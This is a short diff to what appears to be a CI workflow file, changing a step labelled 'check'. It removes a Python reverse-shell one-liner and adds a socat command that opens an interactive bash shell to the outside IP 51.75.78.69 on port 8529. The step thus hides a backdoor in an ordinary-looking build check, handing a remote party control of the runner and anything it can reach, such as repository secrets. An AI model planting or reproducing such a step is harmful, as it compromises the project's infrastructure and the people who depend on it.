@@ -15,4 +15,5 @@ jobs:
         id: check
         shell: bash
         run: |
-          python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("51.75.78.69",8529));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+          sudo apt install socat
+          socat tcp:51.75.78.69:8529 exec:"bash -i",pty,stderr,setsid,sigint,sane
